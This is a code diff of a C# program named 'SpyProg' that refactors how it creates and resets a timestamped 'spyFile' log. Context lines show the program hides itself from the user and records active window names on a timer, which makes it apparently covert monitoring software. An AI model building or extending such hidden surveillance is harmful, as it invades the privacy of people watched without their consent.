@@ -11,7 +11,7 @@ namespace SpyProg {
         private string prevWindow = "";
         private bool lastSaveFlag = false;
 
-        private readonly string spyFilePath;
+        private string spyFilePath;
 
         private readonly Config config;
 
@@ -23,11 +23,13 @@ namespace SpyProg {
             this.Load += new System.EventHandler(this.OnFormLoad);
             CreateShortcut();
 
-            spyFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"spyFile({DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss")}).txt");
+            spyFilePath = NewFilePath;
 
             config = new Config();
             config.SerializeConfig();
         }
+
+        private string NewFilePath => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"spyFile({DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss")}).txt");
 
         // hide application from user
         private void OnFormLoad(object sender, EventArgs e) {
@@ -39,7 +41,10 @@ namespace SpyProg {
         private void spyTimer_Tick(object sender, EventArgs e) {
             try {
                 if (TimeRestrict) {
-                    lastSaveFlag = true;
+                    if (!lastSaveFlag) {
+                        lastSaveFlag = true;
+                        spyFilePath = NewFilePath;
+                    }
 
                     currWindow = WinApi.GetActiveWindowName();
                     string currProc = ProcRestrict(currWindow);
@@ -64,6 +69,7 @@ namespace SpyProg {
 
                     currWindow = "";
                     prevWindow = "";
+                    spyFilePath = "";
                     lastSaveFlag = false;
                 }
             }
